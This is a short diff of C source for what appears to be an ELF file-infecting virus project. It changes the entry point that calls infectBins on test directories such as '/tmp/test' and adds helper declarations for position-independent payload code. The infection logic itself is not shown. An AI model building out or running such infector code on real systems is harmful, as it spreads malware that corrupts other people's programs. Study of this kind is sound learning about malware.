@@ -26,21 +26,18 @@ struct  linux_dirent {
 static void end(void);
 static void lambdaEnd(void);
 static void lambdaStart(void);
+static size_t strlen(const char *s);
 static int  infectBins(const char *dirname);
+static void *memcpy(void *dest, const void *src, size_t);
 
 int   entry_point(void *magic) {
-  /* size_t  i; */
-  // TODO Array of string
   char    infectDir[] = "/tmp/test";
+  char    infectDir2[] = "/tmp/test2";
 
-/*   i = 0; */
   if (infectBins(infectDir) == -1)
     return (1);
-  /* while (infectDir[i] != NULL) { */
-  /*   if (infectBins(infectDir[0]) == -1) */
-  /*     return (1); */
-  /*   i += 1; */
-  /* } */
+  /* if (infectBins(infectDir2) == -1) */
+  /*   return (1); */
   if (magic == (void *)0x42)
     return (0);
   register int64_t rax2 asm("rax") = 0;
